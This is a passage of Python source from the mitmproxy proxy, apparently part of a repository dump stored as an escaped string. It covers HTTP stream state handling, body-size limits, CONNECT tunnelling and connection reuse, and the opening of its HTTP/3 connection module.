SendHttp(\n                    RequestHeaders(\n                        self.stream_id, self.flow.request, done_after_headers\n                    ),\n                    self.context.server,\n                )\n                if content:\n                    yield SendHttp(\n                        RequestData(self.stream_id, content), self.context.server\n                    )\n                if self.flow.request.trailers:\n                    yield SendHttp(\n                        RequestTrailers(self.stream_id, self.flow.request.trailers),\n                        self.context.server,\n                    )\n                yield SendHttp(RequestEndOfMessage(self.stream_id), self.context.server)\n\n    @expect(ResponseHeaders)\n    def state_wait_for_response_headers(\n        self, event: ResponseHeaders\n    ) -> layer.CommandGenerator[None]:\n        self.flow.response = event.response\n\n        if not event.end_stream and (yield from self.check_body_size(False)):\n            return\n\n        yield HttpResponseHeadersHook(self.flow)\n        if (yield from self.check_killed(True)):\n            return\n\n        elif self.flow.response.stream:\n            yield from self.start_response_stream()\n        else:\n            self.server_state = self.state_consume_response_body\n\n    def start_response_stream(self) -> layer.CommandGenerator[None]:\n        assert self.flow.response\n        yield SendHttp(\n            ResponseHeaders(self.stream_id, self.flow.response, end_stream=False),\n            self.context.client,\n        )\n        yield commands.Log(f\"Streaming response from {self.flow.request.host}.\")\n        self.server_state = self.state_stream_response_body\n\n    @expect(ResponseData, ResponseTrailers, ResponseEndOfMessage)\n    def state_stream_response_body(\n        self, event: events.Event\n    ) -> layer.CommandGenerator[None]:\n        assert self.flow.response\n        if isinstance(event, ResponseData):\n            if callable(self.flow.response.stream):\n                chunks = self.flow.response.stream(event.data)\n                if isinstance(chunks, bytes):\n                    chunks = [chunks]\n            else:\n                chunks = [event.data]\n            for chunk in chunks:\n                yield SendHttp(ResponseData(self.stream_id, chunk), self.context.client)\n        elif isinstance(event, ResponseTrailers):\n            self.flow.response.trailers = event.trailers\n            # will be sent in send_response() after the response hook.\n        elif isinstance(event, ResponseEndOfMessage):\n            if callable(self.flow.response.stream):\n                chunks = self.flow.response.stream(b\"\")\n                if chunks == b\"\":\n                    chunks = []\n                elif isinstance(chunks, bytes):\n                    chunks = [chunks]\n                for chunk in chunks:\n                    yield SendHttp(\n                        ResponseData(self.stream_id, chunk), self.context.client\n                    )\n            yield from self.send_response(already_streamed=True)\n\n    @expect(ResponseData, ResponseTrailers, ResponseEndOfMessage)\n    def state_consume_response_body(\n        self, event: events.Event\n    ) -> layer.CommandGenerator[None]:\n        if isinstance(event, ResponseData):\n            self.response_body_buf += event.data\n            yield from self.check_body_size(False)\n        elif isinstance(event, ResponseTrailers):\n            assert self.flow.response\n            self.flow.response.trailers = event.trailers\n        elif isinstance(event, ResponseEndOfMessage):\n            assert self.flow.response\n            self.flow.response.data.content = bytes(self.response_body_buf)\n            self.response_body_buf.clear()\n            yield from self.send_response()\n\n    def send_response(self, already_streamed: bool = False):\n        \"\"\"We have either consumed the entire response from the server or the response was set by an addon.\"\"\"\n        assert self.flow.response\n        self.flow.response.timestamp_end = time.time()\n\n        is_websocket = (\n            self.flow.response.status_code == 101\n            and self.flow.response.headers.get(\"upgrade\", \"\").lower() == \"websocket\"\n            and self.flow.request.headers.get(\"Sec-WebSocket-Version\", \"\").encode()\n            == wsproto.handshake.WEBSOCKET_VERSION\n            and self.context.options.websocket\n        )\n        if is_websocket:\n            # We need to set this before calling the response hook\n            # so that addons can determine if a WebSocket connection is following up.\n            self.flow.websocket = WebSocketData()\n\n        yield HttpResponseHook(self.flow)\n        self.server_state = self.state_done\n        if (yield from self.check_killed(False)):\n            return\n\n        if not already_streamed:\n            content = self.flow.response.raw_content\n            done_after_headers = not (content or self.flow.response.trailers)\n            yield SendHttp(\n                ResponseHeaders(self.stream_id, self.flow.response, done_after_headers),\n                self.context.client,\n            )\n            if content:\n                yield SendHttp(\n                    ResponseData(self.stream_id, content), self.context.client\n                )\n\n        if self.flow.response.trailers:\n            yield SendHttp(\n                ResponseTrailers(self.stream_id, self.flow.response.trailers),\n                self.context.client,\n            )\n\n        if self.client_state == self.state_done:\n            yield from self.flow_done()\n\n    def flow_done(self) -> layer.CommandGenerator[None]:\n        if not self.flow.websocket:\n            self.flow.live = False\n\n        assert self.flow.response\n        if self.flow.response.status_code == 101:\n            if self.flow.websocket:\n                self.child_layer = websocket.WebsocketLayer(self.context, self.flow)\n            elif self.context.options.rawtcp:\n                self.child_layer = tcp.TCPLayer(self.context)\n            else:\n                yield commands.Log(\n                    f\"Sent HTTP 101 response, but no protocol is enabled to upgrade to.\",\n                    WARNING,\n                )\n                yield commands.CloseConnection(self.context.client)\n                self.client_state = self.server_state = self.state_errored\n                return\n            if self.debug:\n                yield commands.Log(\n                    f\"{self.debug}[http] upgrading to {self.child_layer}\", DEBUG\n                )\n            self._handle_event = self.passthrough\n            yield from self.child_layer.handle_event(events.Start())\n        else:\n            yield DropStream(self.stream_id)\n\n        # delay sending EOM until the child layer is set up,\n        # we may get data immediately and need to be prepared to handle it.\n        yield SendHttp(ResponseEndOfMessage(self.stream_id), self.context.client)\n\n    def check_body_size(self, request: bool) -> layer.CommandGenerator[bool]:\n        \"\"\"\n        Check if the body size exceeds limits imposed by stream_large_bodies or body_size_limit.\n\n        Returns `True` if the body size exceeds body_size_limit and further processing should be stopped.\n        \"\"\"\n        if not (\n            self.context.options.stream_large_bodies\n            or self.context.options.body_size_limit\n        ):\n            return False\n\n        # Step 1: Determine the expected body size. This can either come from a known content-length header,\n        # or from the amount of currently buffered bytes (e.g. for chunked encoding).\n        response = not request\n        expected_size: int | None\n        # the 'late' case: we already started consuming the body\n        if request and self.request_body_buf:\n            expected_size = len(self.request_body_buf)\n        elif response and self.response_body_buf:\n            expected_size = len(self.response_body_buf)\n        else:\n            # the 'early' case: we have not started consuming the body\n            try:\n                expected_size = expected_http_body_size(\n                    self.flow.request, self.flow.response if response else None\n                )\n            except ValueError:  # pragma: no cover\n                # we just don't stream/kill malformed content-length headers.\n                expected_size = None\n\n        if expected_size is None or expected_size <= 0:\n            return False\n\n        # Step 2: Do we need to abort this?\n        max_total_size = human.parse_size(self.context.options.body_size_limit)\n        if max_total_size is not None and expected_size > max_total_size:\n            if request and not self.request_body_buf:\n                yield HttpRequestHeadersHook(self.flow)\n            if response and not self.response_body_buf:\n                yield HttpResponseHeadersHook(self.flow)\n\n            err_msg = f\"{'Request' if request else 'Response'} body exceeds mitmproxy's body_size_limit.\"\n            err_code = 413 if request else 502\n\n            self.flow.error = flow.Error(err_msg)\n            yield HttpErrorHook(self.flow)\n            yield SendHttp(\n                ResponseProtocolError(self.stream_id, err_msg, err_code),\n                self.context.client,\n            )\n            self.client_state = self.state_errored\n            if response:\n                yield SendHttp(\n                    RequestProtocolError(self.stream_id, err_msg, err_code),\n                    self.context.server,\n                )\n                self.server_state = self.state_errored\n            self.flow.live = False\n            return True\n\n        # Step 3: Do we need to stream this?\n        max_stream_size = human.parse_size(self.context.options.stream_large_bodies)\n        if max_stream_size is not None and expected_size > max_stream_size:\n            if request:\n                self.flow.request.stream = True\n                if self.request_body_buf:\n                    # clear buffer and then fake a DataReceived event with everything we had in the buffer so far.\n                    body_buf = bytes(self.request_body_buf)\n                    self.request_body_buf.clear()\n                    yield from self.start_request_stream()\n                    yield from self.handle_event(RequestData(self.stream_id, body_buf))\n            if response:\n                assert self.flow.response\n                self.flow.response.stream = True\n                if self.response_body_buf:\n                    body_buf = bytes(self.response_body_buf)\n                    self.response_body_buf.clear()\n                    yield from self.start_response_stream()\n                    yield from self.handle_event(ResponseData(self.stream_id, body_buf))\n        return False\n\n    def check_killed(self, emit_error_hook: bool) -> layer.CommandGenerator[bool]:\n        killed_by_us = (\n            self.flow.error and self.flow.error.msg == flow.Error.KILLED_MESSAGE\n        )\n        # The client may have closed the connection while we were waiting for the hook to complete.\n        # We peek into the event queue to see if that is the case.\n        killed_by_remote = None\n        for evt in self._paused_event_queue:\n            if isinstance(evt, RequestProtocolError):\n                killed_by_remote = evt.message\n                break\n\n        if killed_by_remote:\n            if not self.flow.error:\n                self.flow.error = flow.Error(killed_by_remote)\n        if killed_by_us or killed_by_remote:\n            if emit_error_hook:\n                yield HttpErrorHook(self.flow)\n            # Use the special NO_RESPONSE status code to make sure that no error message is sent to the client.\n            yield SendHttp(\n                ResponseProtocolError(\n                    self.stream_id, \"killed\", status_codes.NO_RESPONSE\n                ),\n                self.context.client,\n            )\n            self.flow.live = False\n            self.client_state = self.server_state = self.state_errored\n            return True\n        return False\n\n    def handle_protocol_error(\n        self, event: RequestProtocolError | ResponseProtocolError\n    ) -> layer.CommandGenerator[None]:\n        is_client_error_but_we_already_talk_upstream = (\n            isinstance(event, RequestProtocolError)\n            and self.client_state in (self.state_stream_request_body, self.state_done)\n            and self.server_state not in (self.state_done, self.state_errored)\n        )\n        need_error_hook = not (\n            self.client_state == self.state_errored\n            or self.server_state in (self.state_done, self.state_errored)\n        )\n\n        if is_client_error_but_we_already_talk_upstream:\n            yield SendHttp(event, self.context.server)\n            self.client_state = self.state_errored\n\n        if need_error_hook:\n            # We don't want to trigger both a response hook and an error hook,\n            # so we need to check if the response is done yet or not.\n            self.flow.error = flow.Error(event.message)\n            yield HttpErrorHook(self.flow)\n\n        if (yield from self.check_killed(False)):\n            return\n\n        if isinstance(event, ResponseProtocolError):\n            if self.client_state != self.state_errored:\n                yield SendHttp(event, self.context.client)\n            self.server_state = self.state_errored\n\n        self.flow.live = False\n        yield DropStream(self.stream_id)\n\n    def make_server_connection(self) -> layer.CommandGenerator[bool]:\n        connection, err = yield GetHttpConnection(\n            (self.flow.request.host, self.flow.request.port),\n            self.flow.request.scheme == \"https\",\n            self.flow.server_conn.via,\n            self.flow.server_conn.transport_protocol,\n        )\n        if err:\n            yield from self.handle_protocol_error(\n                ResponseProtocolError(self.stream_id, err)\n            )\n            return False\n        else:\n            self.context.server = self.flow.server_conn = connection\n            return True\n\n    def handle_connect(self) -> layer.CommandGenerator[None]:\n        self.client_state = self.state_done\n        yield HttpConnectHook(self.flow)\n        if (yield from self.check_killed(False)):\n            return\n\n        self.context.server.address = (self.flow.request.host, self.flow.request.port)\n\n        if self.mode == HTTPMode.regular:\n            yield from self.handle_connect_regular()\n        else:\n            yield from self.handle_connect_upstream()\n\n    def handle_connect_regular(self):\n        if (\n            not self.flow.response\n            and self.context.options.connection_strategy == \"eager\"\n        ):\n            err = yield commands.OpenConnection(self.context.server)\n            if err:\n                self.flow.response = http.Response.make(\n                    502,\n                    f\"Cannot connect to {human.format_address(self.context.server.address)}: {err} \"\n                    f\"If you plan to redirect requests away from this server, \"\n                    f\"consider setting `connection_strategy` to `lazy` to suppress early connections.\",\n                )\n        self.child_layer = layer.NextLayer(self.context)\n        yield from self.handle_connect_finish()\n\n    def handle_connect_upstream(self):\n        self.child_layer = _upstream_proxy.HttpUpstreamProxy.make(self.context, True)[0]\n        yield from self.handle_connect_finish()\n\n    def handle_connect_finish(self):\n        if not self.flow.response:\n            # Do not send any response headers as it breaks proxying non-80 ports on\n            # Android emulators using the -http-proxy option.\n            self.flow.response = http.Response(\n                self.flow.request.data.http_version,\n                200,\n                b\"Connection established\",\n                http.Headers(),\n                b\"\",\n                None,\n                time.time(),\n                time.time(),\n            )\n\n        if 200 <= self.flow.response.status_code < 300:\n            yield HttpConnectedHook(self.flow)\n            self.child_layer = self.child_layer or layer.NextLayer(self.context)\n            self._handle_event = self.passthrough\n            yield from self.child_layer.handle_event(events.Start())\n        else:\n            yield HttpConnectErrorHook(self.flow)\n            self.client_state = self.state_errored\n            self.flow.live = False\n\n        content = self.flow.response.raw_content\n        done_after_headers = not (content or self.flow.response.trailers)\n        yield SendHttp(\n            ResponseHeaders(self.stream_id, self.flow.response, done_after_headers),\n            self.context.client,\n        )\n        if content:\n            yield SendHttp(ResponseData(self.stream_id, content), self.context.client)\n\n        if self.flow.response.trailers:\n            yield SendHttp(\n                ResponseTrailers(self.stream_id, self.flow.response.trailers),\n                self.context.client,\n            )\n        yield SendHttp(ResponseEndOfMessage(self.stream_id), self.context.client)\n\n    @expect(RequestData, RequestEndOfMessage, events.Event)\n    def passthrough(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert self.flow.response\n        assert self.child_layer\n        # HTTP events -> normal connection events\n        if isinstance(event, RequestData):\n            event = events.DataReceived(self.context.client, event.data)\n        elif isinstance(event, ResponseData):\n            event = events.DataReceived(self.context.server, event.data)\n        elif isinstance(event, RequestEndOfMessage):\n            event = events.ConnectionClosed(self.context.client)\n        elif isinstance(event, ResponseEndOfMessage):\n            event = events.ConnectionClosed(self.context.server)\n\n        for command in self.child_layer.handle_event(event):\n            # normal connection events -> HTTP events\n            if isinstance(command, commands.SendData):\n                if command.connection == self.context.client:\n                    yield SendHttp(\n                        ResponseData(self.stream_id, command.data), self.context.client\n                    )\n                elif (\n                    command.connection == self.context.server\n                    and self.flow.response.status_code == 101\n                ):\n                    # there only is a HTTP server connection if we have switched protocols,\n                    # not if a connection is established via CONNECT.\n                    yield SendHttp(\n                        RequestData(self.stream_id, command.data), self.context.server\n                    )\n                else:\n                    yield command\n            elif isinstance(command, commands.CloseConnection):\n                if command.connection == self.context.client:\n                    yield SendHttp(\n                        ResponseProtocolError(self.stream_id, \"EOF\"),\n                        self.context.client,\n                    )\n                elif (\n                    command.connection == self.context.server\n                    and self.flow.response.status_code == 101\n                ):\n                    yield SendHttp(\n                        RequestProtocolError(self.stream_id, \"EOF\"), self.context.server\n                    )\n                else:\n                    # If we are running TCP over HTTP we want to be consistent with half-closes.\n                    # The easiest approach for this is to just always full close for now.\n                    # Alternatively, we could signal that we want a half close only through ResponseProtocolError,\n                    # but that is more complex to implement.\n                    if isinstance(command, commands.CloseTcpConnection):\n                        command = commands.CloseConnection(command.connection)\n                    yield command\n            else:\n                yield command\n\n    @expect()\n    def state_uninitialized(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    @expect()\n    def state_done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    def state_errored(self, _) -> layer.CommandGenerator[None]:\n        # silently consume every event.\n        yield from ()\n\n\nclass HttpLayer(layer.Layer):\n    \"\"\"\n    ConnectionEvent: We have received b\"GET /\\r\\n\\r\\n\" from the client.\n    HttpEvent: We have received request headers\n    HttpCommand: Send request headers to X\n    ConnectionCommand: Send b\"GET /\\r\\n\\r\\n\" to server.\n\n    ConnectionEvent -> HttpEvent -> HttpCommand -> ConnectionCommand\n    \"\"\"\n\n    mode: HTTPMode\n    command_sources: dict[commands.Command, layer.Layer]\n    streams: dict[int, HttpStream]\n    connections: dict[Connection, layer.Layer]\n    waiting_for_establishment: collections.defaultdict[\n        Connection, list[GetHttpConnection]\n    ]\n\n    def __init__(self, context: Context, mode: HTTPMode):\n        super().__init__(context)\n        self.mode = mode\n\n        self.waiting_for_establishment = collections.defaultdict(list)\n        self.streams = {}\n        self.command_sources = {}\n        self.connections = {}\n\n    def __repr__(self):\n        return f\"HttpLayer({self.mode.name}, conns: {len(self.connections)})\"\n\n    def _handle_event(self, event: events.Event):\n        if isinstance(event, events.Start):\n            http_conn: HttpConnection\n            if is_h3_alpn(self.context.client.alpn):\n                http_conn = Http3Server(self.context.fork())\n            elif self.context.client.alpn == b\"h2\":\n                http_conn = Http2Server(self.context.fork())\n            else:\n                http_conn = Http1Server(self.context.fork())\n\n            # may have been set by client playback.\n            self.connections.setdefault(self.context.client, http_conn)\n            yield from self.event_to_child(self.connections[self.context.client], event)\n            if self.mode is HTTPMode.upstream:\n                proxy_mode = self.context.client.proxy_mode\n                assert isinstance(proxy_mode, UpstreamMode)\n                self.context.server.via = (proxy_mode.scheme, proxy_mode.address)\n        elif isinstance(event, events.CommandCompleted):\n            stream = self.command_sources.pop(event.command)\n            yield from self.event_to_child(stream, event)\n        elif isinstance(event, events.MessageInjected):\n            # For injected messages we pass the HTTP stacks entirely and directly address the stream.\n            try:\n                conn = self.connections[event.flow.server_conn]\n            except KeyError:\n                # We have a miss for the server connection, which means we're looking at a connection object\n                # that is tunneled over another connection (for example: over an upstream HTTP proxy).\n                # We now take the stream associated with the client connection. That won't work for HTTP/2,\n                # but it's good enough for HTTP/1.\n                conn = self.connections[event.flow.client_conn]\n            if isinstance(conn, HttpStream):\n                stream_id = conn.stream_id\n            else:\n                # We reach to the end of the connection's child stack to get the HTTP/1 client layer,\n                # which tells us which stream we are dealing with.\n                conn = conn.context.layers[-1]\n                assert isinstance(conn, Http1Connection)\n                assert conn.stream_id\n                stream_id = conn.stream_id\n            yield from self.event_to_child(self.streams[stream_id], event)\n        elif isinstance(event, events.ConnectionEvent):\n            if (\n                event.connection == self.context.server\n                and self.context.server not in self.connections\n            ):\n                # We didn't do anything with this connection yet, now the peer is doing something.\n                if isinstance(event, events.ConnectionClosed):\n                    # The peer has closed it - let's close it too!\n                    yield commands.CloseConnection(event.connection)\n                elif isinstance(event, (events.DataReceived, QuicStreamEvent)):\n                    # The peer has sent data or another connection activity occurred.\n                    # This can happen with HTTP/2 servers that already send a settings frame.\n                    child_layer: HttpConnection\n                    if is_h3_alpn(self.context.server.alpn):\n                        child_layer = Http3Client(self.context.fork())\n                    elif self.context.server.alpn == b\"h2\":\n                        child_layer = Http2Client(self.context.fork())\n                    else:\n                        child_layer = Http1Client(self.context.fork())\n                    self.connections[self.context.server] = child_layer\n                    yield from self.event_to_child(child_layer, events.Start())\n                    yield from self.event_to_child(child_layer, event)\n                else:\n                    raise AssertionError(f\"Unexpected event: {event}\")\n            else:\n                handler = self.connections[event.connection]\n                yield from self.event_to_child(handler, event)\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    def event_to_child(\n        self,\n        child: layer.Layer | HttpStream,\n        event: events.Event,\n    ) -> layer.CommandGenerator[None]:\n        for command in child.handle_event(event):\n            assert isinstance(command, commands.Command)\n            # Streams may yield blocking commands, which ultimately generate CommandCompleted events.\n            # Those need to be routed back to the correct stream, so we need to keep track of that.\n\n            if command.blocking or isinstance(command, commands.RequestWakeup):\n                self.command_sources[command] = child\n\n            if isinstance(command, ReceiveHttp):\n                if isinstance(command.event, RequestHeaders):\n                    yield from self.make_stream(command.event.stream_id)\n                try:\n                    stream = self.streams[command.event.stream_id]\n                except KeyError:\n                    # We may be getting data or errors for a stream even though we've already finished handling it,\n                    # see for example https://github.com/mitmproxy/mitmproxy/issues/5343.\n                    pass\n                else:\n                    yield from self.event_to_child(stream, command.event)\n            elif isinstance(command, SendHttp):\n                conn = self.connections[command.connection]\n                yield from self.event_to_child(conn, command.event)\n            elif isinstance(command, DropStream):\n                self.streams.pop(command.stream_id, None)\n            elif isinstance(command, GetHttpConnection):\n                yield from self.get_connection(command)\n            elif isinstance(command, RegisterHttpConnection):\n                yield from self.register_connection(command)\n            elif isinstance(command, commands.OpenConnection):\n                self.connections[command.connection] = child\n                yield command\n            elif isinstance(command, commands.Command):\n                yield command\n            else:\n                raise AssertionError(f\"Not a command: {event}\")\n\n    def make_stream(self, stream_id: int) -> layer.CommandGenerator[None]:\n        ctx = self.context.fork()\n        self.streams[stream_id] = HttpStream(ctx, stream_id)\n        yield from self.event_to_child(self.streams[stream_id], events.Start())\n\n    def get_connection(\n        self, event: GetHttpConnection, *, reuse: bool = True\n    ) -> layer.CommandGenerator[None]:\n        # Do we already have a connection we can re-use?\n        if reuse:\n            for connection in self.connections:\n                connection_suitable = event.connection_spec_matches(connection)\n                if connection_suitable:\n                    if connection in self.waiting_for_establishment:\n                        self.waiting_for_establishment[connection].append(event)\n                        return\n                    elif connection.error:\n                        stream = self.command_sources.pop(event)\n                        yield from self.event_to_child(\n                            stream,\n                            GetHttpConnectionCompleted(event, (None, connection.error)),\n                        )\n                        return\n                    elif connection.connected:\n                        # see \"tricky multiplexing edge case\" in make_http_connection for an explanation\n                        h2_to_h1 = (\n                            self.context.client.alpn == b\"h2\"\n                            and connection.alpn != b\"h2\"\n                        )\n                        if not h2_to_h1:\n                            stream = self.command_sources.pop(event)\n                            yield from self.event_to_child(\n                                stream,\n                                GetHttpConnectionCompleted(event, (connection, None)),\n                            )\n                            return\n                    else:\n                        pass  # the connection is at least half-closed already, we want a new one.\n\n        context_connection_matches = (\n            self.context.server not in self.connections\n            and event.connection_spec_matches(self.context.server)\n        )\n        can_use_context_connection = (\n            context_connection_matches and self.context.server.connected\n        )\n        if context_connection_matches and self.context.server.error:\n            stream = self.command_sources.pop(event)\n            yield from self.event_to_child(\n                stream,\n                GetHttpConnectionCompleted(event, (None, self.context.server.error)),\n            )\n            return\n\n        context = self.context.fork()\n\n        stack = tunnel.LayerStack()\n\n        if not can_use_context_connection:\n            context.server = Server(\n                address=event.address, transport_protocol=event.transport_protocol\n            )\n\n            if event.via:\n                context.server.via = event.via\n                # We always send a CONNECT request, *except* for plaintext absolute-form HTTP requests in upstream mode.\n                send_connect = event.tls or self.mode != HTTPMode.upstream\n                stack /= _upstream_proxy.HttpUpstreamProxy.make(context, send_connect)\n            if event.tls:\n                # Assume that we are in transparent mode and lazily did not open a connection yet.\n                # We don't want the IP (which is the address) as the upstream SNI, but the client's SNI instead.\n                if (\n                    self.mode == HTTPMode.transparent\n                    and event.address == self.context.server.address\n                ):\n                    # reverse proxy mode may set self.context.server.sni, which takes precedence.\n                    context.server.sni = (\n                        self.context.server.sni\n                        or self.context.client.sni\n                        or event.address[0]\n                    )\n                else:\n                    context.server.sni = event.address[0]\n                if context.server.transport_protocol == \"tcp\":\n                    stack /= tls.ServerTLSLayer(context)\n                elif context.server.transport_protocol == \"udp\":\n                    stack /= quic.ServerQuicLayer(context)\n                else:\n                    raise AssertionError(\n                        context.server.transport_protocol\n                    )  # pragma: no cover\n\n        stack /= HttpClient(context)\n\n        self.connections[context.server] = stack[0]\n        self.waiting_for_establishment[context.server].append(event)\n\n        yield from self.event_to_child(stack[0], events.Start())\n\n    def register_connection(\n        self, command: RegisterHttpConnection\n    ) -> layer.CommandGenerator[None]:\n        waiting = self.waiting_for_establishment.pop(command.connection)\n\n        reply: tuple[None, str] | tuple[Connection, None]\n        if command.err:\n            reply = (None, command.err)\n        else:\n            reply = (command.connection, None)\n\n        for cmd in waiting:\n            stream = self.command_sources.pop(cmd)\n            yield from self.event_to_child(\n                stream, GetHttpConnectionCompleted(cmd, reply)\n            )\n\n            # Tricky multiplexing edge case: Assume we are doing HTTP/2 -> HTTP/1 proxying and the destination server\n            # only serves responses with HTTP read-until-EOF semantics. In this case we can't process two flows on the\n            # same connection. The only workaround left is to open a separate connection for each flow.\n            if (\n                not command.err\n                and self.context.client.alpn == b\"h2\"\n                and command.connection.alpn != b\"h2\"\n            ):\n                for cmd in waiting[1:]:\n                    yield from self.get_connection(cmd, reuse=False)\n                break\n\n\nclass HttpClient(layer.Layer):\n    child_layer: layer.Layer\n\n    @expect(events.Start)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        err: str | None\n        if self.context.server.connected:\n            err = None\n        else:\n            err = yield commands.OpenConnection(self.context.server)\n        if not err:\n            if is_h3_alpn(self.context.server.alpn):\n                self.child_layer = Http3Client(self.context)\n            elif self.context.server.alpn == b\"h2\":\n                self.child_layer = Http2Client(self.context)\n            else:\n                self.child_layer = Http1Client(self.context)\n            self._handle_event = self.child_layer.handle_event\n            yield from self._handle_event(event)\n        yield RegisterHttpConnection(self.context.server, err)\n", "mitmproxy/proxy/layers/http/_http3.py": "import time\nfrom abc import abstractmethod\n\nfrom aioquic.h3.connection import ErrorCode as H3ErrorCode\nfrom aioquic.h3.connection import FrameUnexpected as H3FrameUnexpected\nfrom aioquic.h3.events import DataReceived\nfrom aioquic.h3.events import HeadersReceived\nfrom aioquic.h3.events import PushPromiseReceived\n\nfrom . import RequestData\nfrom . import RequestEndOfMessage\nfrom . import RequestHeaders\nfrom . import RequestProtocolError\nfrom . import RequestTrailers\nfrom . import ResponseData\nfrom . import ResponseEndOfMessage\nfrom . import ResponseHeaders\nfrom . import ResponseProtocolError\nfrom . import ResponseTrailers\nfrom ._base import format_error\nfrom ._base import HttpConnection\nfrom ._base import HttpEvent\nfrom ._base import ReceiveHttp\nfrom ._http2 import format_h2_request_headers\nfrom ._http2 import format_h2_response_headers\nfrom ._http2 import parse_h2_request_headers\nfrom ._http2 import parse_h2_response_headers\nfrom ._http_h3 import LayeredH3Connection\nfrom ._http_h3 import StreamReset\nfrom ._http_h3 import TrailersReceived\nfrom mitmproxy import connection\nfrom mitmproxy import http\nfrom mitmproxy import version\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.layers.quic import error_code_to_str\nfrom mitmproxy.proxy.layers.quic import QuicConnectionClosed\nfrom mitmproxy.proxy.layers.quic import QuicStreamEvent\nfrom mitmproxy.proxy.layers.quic import StopQuicStream\nfrom mitmproxy.proxy.utils import expect\n\n\nclass Http3Connection(HttpConnection):\n    h3_conn: LayeredH3Connection\n\n    ReceiveData: type[RequestData | ResponseData]\n    ReceiveEndOfMessage: type[RequestEndOfMessage | ResponseEndOfMessage]\n    ReceiveProtocolError: type[RequestProtocolError | ResponseProtocolError]\n    ReceiveTrailers: type[RequestTrailers | ResponseTrailers]\n\n    def __init__(self, context: context.Context, conn: connection.Connection):\n        super().__init__(context, conn)\n        self.h3_conn = LayeredH3Connection(\n            self.conn, is_client=self.conn is self.context.server\n        )\n        self._stream_protocol_errors: dict[int, int] = {}\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.Start):\n            yield from self.h3_conn.transmit()\n\n        # send mitmproxy HTTP events over the H3 connection\n        elif isinstance(event, HttpEvent):\n            try:\n                if isinstance(event, (RequestData, ResponseData)):\n                    self.h3_conn.send_data(event.stream_id, event.data)\n                elif isinstance(event, (RequestHeaders, ResponseHeaders)):\n                    headers = yield from (\n                        format_h2_request_headers(self.context, event)\n                        if isinstance(event, RequestHeaders)\n                        else format_h2_response_headers(self.context, event)\n                    )\n                    self.h3_conn.send_headers(\n                        event.stream_id, headers, end_stream=event.end_stream\n                    )\n                elif isinstance(event, (RequestTrailers, ResponseTrailers)):\n                    self.h3_conn.send_trailers(\n                        event.stream_id, [*event.trailers.fields]\n                    )\n                elif isinstance(event, (RequestEndOfMessage, ResponseEndOfMessage)):\n                    self.h3_conn.end_stream(event.stream_id)\n                elif isinstance(event, (RequestProtocolError, ResponseProtocolError)):\n                    code = {\n                        status_codes.CLIENT_CLOSED_REQUEST: H3ErrorCode.H3_REQUEST_CANCELLED.value,\n                    }.get(event.code, H3ErrorCode.H3_INTERNAL_ERROR.value)\n                    self._stream_protocol_errors[event.stream_id] = code\n                    send_error_message = (\n                        isinstance(event, ResponseProtocolError)\n                        and not self.h3_conn.has_sent_headers(event.stream_id)\n                        and event.code != status_codes.NO_RESPONSE\n                    )\n                    if send_error_message:\n                        self.h3_conn.send_headers(\n                            event.stream_id,\n                            [\n                                (b\":status\", b\"%d\" % event.code),\n                                (b\"server\", version.MITMPROXY.encode()),\n                                (b\"content-type\", b\"text/html\"),\n                            ],\n                        )\n                        self.h3_conn.send_data(\n                            event.stream_id,\n                            format_error(event.code, event.message),\n                            end_stream=True,\n                        )\n                    else:\n                        self.h3_conn.reset_stream(event.stream_id, code)\n                else:  # pragma: no cover\n                    raise AssertionError(f\"Unexpected event: {event!r}\")\n\n            except H3FrameUnexpected as e:\n                # Http2Connection also ignores HttpEvents that violate the current stream state\n                yield commands.Log(f\"Received {event!r} unexpectedly: {e}\")\n\n            else:\n                # transmit buffered data\n                yield from self.h3_conn.transmit()\n\n        # forward stream messages from the QUIC layer to the H3 connection\n        elif isinstance(event, QuicStreamEvent):\n            h3_events = self.h3_conn.handle_stream_event(event)\n            if event.stream_id in self._stream_protocol_errors:\n                # we already reset or ended the stream, tell the peer to stop\n                # (this is a noop if the peer already did the same)\n                yield StopQuicStream(\n                    self.conn,\n                    event.stream_id,\n                    self._stream_protocol_errors[event.stream_id],\n                )\n            else:\n                for h3_event in h3_events:\n                    if isinstance(h3_event, StreamReset):\n                        if h3_event.push_id is None:\n                            err_str = error_code_to_str(h3_event.error_code)\n                            err_code = {\n                                H3ErrorCode.H3_REQUEST_CANCELLED.value: status_codes.CLIENT_CLOSED_REQUEST,\n                            }.get(h3_event.error_code, self.ReceiveProtocolError.code)\n                            yield ReceiveHttp(\n                                self.ReceiveProtocolError(\n                                    h3_event.stream_id,\n                                    f\"stream reset by client ({err_str})\",\n                                    code=err_code,\n                                )\n                            )\n                    elif isinstance(h3_event, DataReceived):\n                        if h3_event.push_id is None:\n                            if h3_event.data:\n                                yield ReceiveHttp(\n                                    self.ReceiveData(h3_event.stream_id, h3_event.data)\n                                )\n                            if h3_event.stream_ended:\n                                yield ReceiveHttp(\n                                    self.ReceiveEndOfMessage(h3_event.stream_id)\n                                )\n                    elif isinstance(h3_event, HeadersReceived):\n                        if h3_event.push_id is None:\n                            try:\n                                receive_event = self.parse_headers(h3_event)\n                            except ValueError as e:\n                                self.h3_conn.close_connection(\n                                    error_code=H3ErrorCode.H3_GENERAL_PROTOCOL_ERROR,\n                                    reason_phrase=f\"Invalid HTTP/3 request headers: {e}\",\n                                )\n                            else:\n                                yield ReceiveHttp(receive_event)\n                                if h3_event.stream_ended:\n                                    yield ReceiveHttp(\n                                        self.ReceiveEndOfMessage(h3_event.stream_id)\n                                    )\n                    elif isinstance(h3_event, TrailersReceived):\n                        if h3_event.push_id is None:\n                            yield ReceiveHttp(\n                                self.ReceiveTrailers(\n                                    h3_event.stream_id, http.Headers(h3_event.trailers)\n                                )\n                            )\n                            if h3_event.stream_ended:\n                                yield ReceiveHttp(\n                                    self.ReceiveEndOfMessage(h3_event.stream_id)\n                                )\n                    elif isinstance(h3_event, PushPromiseReceived):  # pragma: no cover\n                        # we don't support push\n                        pass\n                    else:  # pragma: no cover\n                        raise AssertionError(f\"Unexpected 